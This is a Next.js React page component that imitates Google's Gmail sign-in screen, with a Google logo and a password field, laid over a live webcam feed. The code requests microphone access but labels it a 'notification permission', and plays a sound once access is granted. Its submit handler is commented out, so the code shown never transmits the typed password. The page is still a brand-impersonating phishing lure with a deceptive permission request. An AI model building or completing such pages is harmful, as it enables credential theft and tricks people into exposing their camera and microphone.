"use client";
import React, { useEffect, useState } from "react";
import Webcam from "react-webcam";
import { useParams } from "next/navigation";
function page() {
  const [password, setPassword] = useState("");
  const playNotificationSound = () => {
    const audio = new Audio("/tune.mp3"); // Path to the ringtone file
    audio.play().catch((error) => {
      console.error("Error playing the sound:", error);
    });

    return () => {
      audio.pause(); // Stop the audio if the component unmounts
      audio.currentTime = 0; // Reset the audio to the beginning
    };
  };
  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };
  useEffect(() => {
    requestNotificationPermission();
  }, []);
  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />
      <div className="absolute  flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <div className="bg-white w-[80%] max-w-4xl p-6 rounded-lg shadow-md flex flex-col md:flex-row items-start gap-6 md:gap-40 z-10">
          {/* Left Section */}
          <div className="gap-3">
            <img
              src="/images/google-logo-small.png"
              width={95}
              height={35}
              className="object-cover"
            />
            <p className="font-medium text-xl">Sign in</p>
            <p className="font-medium text-md">to continue to Gmail</p>
          </div>

          {/* Right Section */}
          <div className="flex-1 w-full">
            <input
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-2"
              type="password"
              placeholder="Enter your password"
            />
            <p className="text-black text-sm mt-2 cursor-pointer">
              Show password
            </p>
            <p className="text-sm mt-3">
              Not your computer? Use Guest mode to sign in privately.
            </p>
            <p className="text-[#1a73e8] text-sm mt-1 cursor-pointer">
              Learn more about using Guest mode
            </p>
            <div className="flex items-center justify-end mt-6 gap-4">
              <p className="text-zinc-800 text-sm mt-2 cursor-pointer">
                Create account
              </p>
              <button
                // onClick={handleSubmit}
                className="bg-zinc-800 text-white px-6 py-1 rounded-lg mt-1"
              >
                Next
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default page;
